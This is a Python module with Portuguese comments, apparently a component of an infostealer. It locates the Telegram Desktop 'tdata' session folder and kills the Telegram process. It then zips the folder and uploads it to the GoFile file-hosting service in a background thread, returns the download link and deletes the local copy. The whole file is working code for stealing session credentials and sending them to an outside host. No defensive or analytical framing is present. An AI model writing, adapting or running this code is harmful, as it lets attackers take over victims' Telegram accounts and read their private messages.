import os
import zipfile
import psutil
import stat
import threading
import logging
import requests

# Configuração do logger
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(asctime)s - %(message)s')

def find_telegram_tdata():
    appdata = os.getenv('APPDATA')
    telegram_path = os.path.join(appdata, 'Telegram Desktop', 'tdata')
    if os.path.isdir(telegram_path):
        logging.info(f"Encontrado o diretório tdata do Telegram: {telegram_path}")
        return telegram_path
    logging.warning("Diretório tdata do Telegram não encontrado")
    return None

def terminate_telegram():
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == 'Telegram.exe':
            logging.info("Terminando o processo do Telegram")
            proc.terminate()
            proc.wait()

def create_zip_file(src, zip_path):
    logging.info(f"Criando arquivo zip em: {zip_path}")
    with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
        for root, dirs, files in os.walk(src):
            for file in files:
                file_path = os.path.join(root, file)
                try:
                    os.chmod(file_path, stat.S_IRWXU)
                    zipf.write(file_path, os.path.relpath(file_path, src))
                    logging.info(f"Adicionado ao zip: {file_path}")
                except PermissionError:
                    logging.warning(f"Permissão negada: {file_path}")
                except Exception as e:
                    logging.error(f"Erro ao adicionar {file_path} ao zip: {e}")

def get_gofile_server(zone=None):
    params = {}
    if zone:
        params['zone'] = zone
    response = requests.get("https://api.gofile.io/servers", params=params)
    if response.status_code == 200:
        data = response.json()
        if data.get("status") == "ok" and "servers" in data["data"]:
            servers = data["data"]["servers"]
            if servers:
                return servers[0]["name"]
        logging.error(f"Erro na resposta do servidor GoFile: {data}")
    else:
        logging.error(f"Falha ao obter servidor GoFile. Status: {response.status_code}")
    return None

def upload_to_gofile(file_path, callback, zone=None, folder_id=None):
    server = get_gofile_server(zone)
    if not server:
        logging.error("Não foi possível obter o servidor GoFile")
        callback(False)
        return

    url = f"https://{server}.gofile.io/uploadFile"
    logging.info(f"Iniciando upload para GoFile: {file_path}")
    logging.info(f"URL de upload: {url}")

    try:
        with open(file_path, "rb") as file:
            files = {"file": file}
            data = {}
            if folder_id:
                data['folderId'] = folder_id
            response = requests.post(url, files=files, data=data)
        
        if response.status_code == 200:
            try:
                data = response.json()
                logging.info(f"Resposta do servidor: {data}")
                if data.get("status") == "ok":
                    download_link = data["data"]["downloadPage"]
                    logging.info(f"Upload bem-sucedido! Link: {download_link}")
                    callback(download_link)
                    os.remove(file_path)  # Exclui o arquivo zip após o upload
                else:
                    logging.error(f"Erro no upload: {data}")
                    callback(False)
            except ValueError as e:
                logging.error(f"Erro ao processar resposta JSON: {e}")
                logging.error(f"Resposta do servidor: {response.text}")
                callback(False)
        else:
            logging.error(f"Falha no upload. Status: {response.status_code}")
            logging.error(f"Resposta do servidor: {response.text}")
            callback(False)
    except Exception as e:
        logging.error(f"Erro durante o upload: {e}")
        callback(False)

def telegram(callback, zone=None, folder_id=None):
    telegram_tdata_path = find_telegram_tdata()
    if telegram_tdata_path:
        terminate_telegram()
        zip_path = os.path.join(os.getenv("TEMP"), "telegram_tdata.zip")
        create_zip_file(telegram_tdata_path, zip_path)
        
        # Start the upload in a new thread after compression is complete
        threading.Thread(target=upload_to_gofile, args=(zip_path, callback, zone, folder_id)).start()
    else:
        callback(False)